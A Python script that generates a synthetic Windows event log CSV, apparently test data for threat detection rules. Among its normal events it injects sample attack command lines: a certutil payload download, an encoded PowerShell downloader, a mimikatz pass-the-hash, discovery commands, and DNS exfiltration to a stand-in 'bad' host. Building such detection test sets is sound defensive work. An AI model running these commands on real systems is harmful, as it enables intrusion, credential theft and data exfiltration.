import csv
import random
from datetime import datetime, timedelta

def generate_unlabeled_dataset(filename, num_events=1000):
    headers = [
        "SystemTime", "Computer", "User", "EventID", "CommandLine", 
        "Image", "Protocol", "SourceIp", "DestinationIp", "DestinationPort"
    ]
    
    hosts = ["WKSTN-01", "WKSTN-02", "WKSTN-03", "SRV-DC-01"]
    users = ["admin", "jsmith", "rdoe", "SYSTEM"]
    images = [
        "C:\\Windows\\System32\\svchost.exe",
        "C:\\Windows\\System32\\cmd.exe",
        "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
        "C:\\Program Files\\Google\\Chrome\\Application\\chrome.exe"
    ]
    # Mix of private and public IPs
    private_ips = ["10.0.0.5", "10.0.0.10", "10.0.0.15", "192.168.1.100"]
    public_ips = ["185.176.27.18", "8.8.8.8", "20.50.100.200", "45.33.32.156"]
    
    start_time = datetime.now()
    
    with open(filename, 'w', newline='') as f:
        writer = csv.DictWriter(f, fieldnames=headers)
        writer.writeheader()
        
        for i in range(num_events):
            # Default to normal
            event_id = random.choice([1, 3, 5])
            cmd = "C:\\Windows\\system32\\svchost.exe -k LocalService"
            image = random.choice(images)
            user = random.choice(users)
            host = random.choice(hosts)
            src_ip = random.choice(private_ips)
            dst_ip = random.choice(private_ips)
            dst_port = random.choice([80, 443, 135, 445])
            
            # Inject some attacks to trigger MITRE, Sigma, Snort, and Threat Intel
            if i == 100:
                # Ingress Tool Transfer (T1105) + Public IP (Threat Intel)
                cmd = "certutil.exe -urlcache -f http://185.176.27.18/payload.exe C:\\Temp\\payload.exe"
                image = "C:\\Windows\\System32\\certutil.exe"
                event_id = 1
                dst_ip = "185.176.27.18"
                dst_port = 80
            elif i == 300:
                # PowerShell Encoded Command (T1059.001)
                cmd = "powershell.exe -enc JABjID0AbgBlAHcALQBvAGIAagBlAGMAdAAgAG4AZQB0AC4AdwBlAGIAYwBsAGkAZQBuAHQAOwAkAGMALgBkAG8AdwBuAGwAbwBhAGQAZgBpAGwAZQAoACcAaAB0AHQAcAA6AC8ALwBiAGEAZAAuAGMAbwBtAC8AcwAuAGUAeABlACcALAAnACUAaABvAG0AZQBwAGEAdABoACUAXABzAC4AZQB4AGUAJwApAA=="
                image = "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe"
                event_id = 1
                dst_ip = "45.33.32.156"
                dst_port = 80
            elif i == 500:
                # Pass-the-Hash (Credential Access + Lateral Movement)
                cmd = "mimikatz.exe \"sekurlsa::pth /user:Administrator /domain:corp.local /ntlm:518b98ad4178a53695dc99773ef7d164\""
                image = "C:\\Temp\\mimikatz.exe"
                event_id = 1
                dst_port = 445
            elif i == 700:
                # Discovery (T1082)
                cmd = "whoami /all & ipconfig /all & net user admin /domain"
                image = "C:\\Windows\\System32\\cmd.exe"
                event_id = 1
            elif i == 800:
                # Exfiltration (T1048.003) + Hash
                cmd = "certutil -encode data.zip data.b64 & nslookup -type=txt exfil.bad.com 8.8.8.8"
                image = "C:\\Windows\\System32\\certutil.exe"
                event_id = 1
                dst_ip = "8.8.8.8"
                dst_port = 53
                
            timestamp = (start_time + timedelta(seconds=i)).isoformat()
            
            writer.writerow({
                "SystemTime": timestamp,
                "Computer": host,
                "User": user,
                "EventID": event_id,
                "CommandLine": cmd,
                "Image": image,
                "Protocol": "TCP",
                "SourceIp": src_ip,
                "DestinationIp": dst_ip,
                "DestinationPort": dst_port
            })

if __name__ == "__main__":
    generate_unlabeled_dataset("unlabeled_test_set.csv")
    print("Generated unlabeled_test_set.csv with 1000 events (including Public IPs and Attack Keywords).")
